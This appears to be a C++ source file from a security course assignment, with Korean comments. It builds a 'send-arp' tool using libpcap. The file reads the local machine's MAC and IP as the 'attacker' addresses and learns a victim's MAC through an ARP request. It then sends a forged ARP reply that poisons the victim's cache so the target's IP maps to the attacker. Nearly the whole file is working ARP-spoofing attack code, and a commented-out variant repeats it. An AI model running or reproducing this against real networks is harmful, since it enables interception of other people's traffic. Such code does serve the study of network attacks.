/*
*	ip, mac은 Mac, Ip 클래스를 사용해 선언 해 주자. (함수에서의 인자값, 리턴값도 이걸로 사용하자.)
*	키벨류로 값 비교를 많이 하기때문에 string이 아니라 꼭 몇 바이트 몇 바이트 확인하자 그게 빠르다
*	
*
*/

#include <cstdio>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"



#pragma pack(push, 1)

struct EthArpPacket final { //Ethernet - Arp 구조체 선언
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct ifreq ifr;
uint8_t* attacker_mac;
char* attacker_ip;

void usage() { //usage
	printf("syntax: send-arp <interface> <sender IP> <target IP>\n");
	printf("sample: send-arp wlan0\n");
}

void getAttackerMac(char* dev){ //attacker의 mac 주소 알아내는 함수
	int sock_d;
	sock_d = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name , dev , IFNAMSIZ - 1);

	ioctl(sock_d, SIOCGIFHWADDR, &ifr);
	attacker_mac = (uint8_t *)ifr.ifr_hwaddr.sa_data;		
}

void getAttackerIP(char* dev){ //attacker의 ip 주소 알아내는 함수
	int sock_d;
	strncpy(ifr.ifr_name , dev , IFNAMSIZ - 1);
	
	sock_d = socket(AF_INET, SOCK_DGRAM, 0);
	ioctl(sock_d, SIOCGIFADDR, &ifr);
	attacker_ip = inet_ntoa(((struct sockaddr_in* )&ifr.ifr_addr)->sin_addr);
}
void sendArpRequest(char* dev, pcap_t* handle, uint32_t sender_ip){ //sender ip의 맥주소 알아내는 arp 전
	EthArpPacket packet; //이더넷, arp 패킷 구조를 선언 
	/*arp request 패킷 구조 만듥기*/
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(attacker_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(attacker_mac);
	packet.arp_.sip_ = htonl(Ip(attacker_ip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = Ip(sender_ip);
	/*패킷 sending*/
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

//void startInfection(char* dev, pcap_t* handle, uint32_t sender_ip, u_char* infected_mac, uint32_t target_ip){ //Infection을 위한 arp reply 시작
//	EthArpPacket packet;
//	
//	packet.eth_.dmac_ = Mac(infected_mac);
//	packet.eth_.smac_ = Mac(attacker_mac);
//	packet.eth_.type_ = htons(EthHdr::Arp);
//
//	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
//	packet.arp_.pro_ = htons(EthHdr::Ip4);
//	packet.arp_.hln_ = Mac::SIZE;
//	packet.arp_.pln_ = Ip::SIZE;
//	packet.arp_.op_ = htons(ArpHdr::Reply);
//	packet.arp_.smac_ = Mac(attacker_mac);
//	packet.arp_.sip_ = htonl(Ip(target_ip));
//	packet.arp_.tmac_ = Mac(infected_mac);
//	packet.arp_.tip_ = htonl(Ip(sender_ip));
//	/*패킷 sending*/
//	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
//	if (res != 0) {
//		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
//	}
//
//}


int main(int argc, char* argv[]) {
	if (argc != 4) { // 인자 갯수 체크
		usage();
		return -1;
	}
	uint32_t sender_ip = inet_addr(argv[2]);
	uint32_t target_ip = inet_addr(argv[3]);
	uint8_t* sender_mac;


	char* dev = argv[1];
	getAttackerMac(dev);
	getAttackerIP(dev);

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf); //패킷 디스크립터 가져오기
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	sendArpRequest(dev, handle, sender_ip); //sender(victime)의 mac주소를 알기위한 arp request
	while (true){//sender mac을 가져오기 위한 패킷 읽기
		struct pcap_pkthdr* header;
		const u_char* packet;
		
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		EthArpPacket* recv_reply_packet = (struct EthArpPacket*)packet;
		if(recv_reply_packet->eth_.type_ != htons(EthHdr::Arp)){//arp 가 아니면 다시 처음부터 
			continue;
		}
		if(recv_reply_packet->arp_.op_ != htons(ArpHdr::Reply)){// reply가 아니면 처음부터
			continue;
		}
		if(recv_reply_packet->arp_.sip_ != Ip(sender_ip)){ // senderip 가 target ip 가아니면 처음부터 
			continue;
		}
		sender_mac = (uint8_t*)(recv_reply_packet->eth_.smac());
		break;
	}
	
	
	EthArpPacket infect_packet;
	
	infect_packet.eth_.dmac_ = Mac(sender_mac);
	infect_packet.eth_.smac_ = Mac(attacker_mac);
	infect_packet.eth_.type_ = htons(EthHdr::Arp);
	infect_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	infect_packet.arp_.pro_ = htons(EthHdr::Ip4);
	infect_packet.arp_.hln_ = Mac::SIZE;
	infect_packet.arp_.pln_ = Ip::SIZE;
	infect_packet.arp_.op_ = htons(ArpHdr::Reply);
	infect_packet.arp_.smac_ = Mac(attacker_mac);
	infect_packet.arp_.sip_ = Ip(target_ip);
	infect_packet.arp_.tmac_ = Mac(sender_mac);
	infect_packet.arp_.tip_ = Ip(sender_ip);
	/*패킷 sending*/
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&infect_packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	pcap_close(handle);
	return 0;
}
